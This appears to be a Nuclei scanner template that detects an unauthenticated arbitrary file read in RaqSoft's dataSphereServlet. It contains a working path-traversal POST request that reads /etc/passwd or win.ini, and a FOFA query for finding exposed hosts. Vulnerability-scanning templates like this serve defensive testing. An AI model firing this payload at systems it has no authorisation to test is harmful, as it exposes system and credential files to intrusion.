http:
- matchers:
  - condition: or
    part: body
    regex:
    - \[(font|extension|file)s\]
    - 'root:.*:0:0:'
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  payloads:
    file:
    - /windows/win.ini
    - /etc/passwd
  raw:
  - 'POST /servlet/dataSphereServlet?action=11 HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    path=../../../../../../../../../../..{{file}}&content=&mode=

    '
  stop-at-first-match: true
id: raqsoft-dataSphereServlet-lfi
info:
  author: Co5mos
  description: "\u6DA6\u4E7E\u62A5\u8868 dataSphereServlet \u63A5\u53E3\u5B58\u5728\
    \u4EFB\u610F\u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1E\uFF0C\u672A\u7ECF\u8EAB\u4EFD\
    \u9A8C\u8BC1\u7684\u653B\u51FB\u8005\u53EF\u4EE5\u901A\u8FC7\u8BE5\u6F0F\u6D1E\
    \u8BFB\u53D6\u7CFB\u7EDF\u5185\u90E8\u654F\u611F\u6587\u4EF6\uFF0C\u83B7\u53D6\
    \u654F\u611F\u4FE1\u606F\u3002\n"
  metadata:
    fofa-query: body="/raqsoft"
  name: RQsoft dataSphereServlet Arbitrary File Read
  severity: critical
  tags: rqsoft, file-read
